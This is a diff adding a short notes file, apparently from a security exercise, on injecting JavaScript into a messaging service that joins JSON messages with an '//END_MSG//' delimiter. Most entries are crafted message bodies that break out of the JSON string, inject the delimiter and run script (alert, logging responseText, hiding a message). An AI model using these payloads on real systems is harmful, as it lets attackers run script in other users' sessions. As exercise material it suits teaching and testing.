@@ -1,0 +1,31 @@
+// example request
+{"date": "Sat Oct 24 23:41:40 2015", "body": "I had a great time at your party, but I must admit that I have hidden your magician's hat. Orange Julius told me to do it!", "from": "Drake", "subject": "You better respond!"}//END_MSG//
+
+// without content
+{"date": "blah", "body": "blah", "from": "blah", "subject": "Blah"}//END_MSG//
+
+// attack code
+To: root
+
+Subject: blah
+
+Body: continuation of original message", "from": "blah", "subject": "Blah"}//END_MSG//window.alert("Test")//END_MSG//{"date": "blah", "body": "blah", "from": "blah", "subject": "Blah
+
+
+
+
+
+// print this.response text
+To: root
+
+Subject: blah
+
+Body: continuation of original message", "from": "blah", "subject": "Blah"} //END_MSG// 1;})(); console.log(this.responseText); (function(){ return //END_MSG// {"date": "blah", "body": "blah", "from": "blah", "subject": "Blah
+
+
+
+//END_MSG//{"date": "blah", "body": "blah", "from": "blah", "subject": "Blah
+
+
+// silence message
+Body: continuation of original message", "from": "blah", "subject": "Blah"} //END_MSG// 1;})(); console.log(this.responseText); (function() { return {"date": "Sat Oct 24 23:41:40 2015", "body": "I had a great time at your party, but I must admit that I have hidden your magician's hat. Orange Julius told me to do it!", "from": "Drake", "subject": "You better respond!"} //END_MSG// {"date": "blah", "body": "blah", "from": "blah", "subject": "Blah
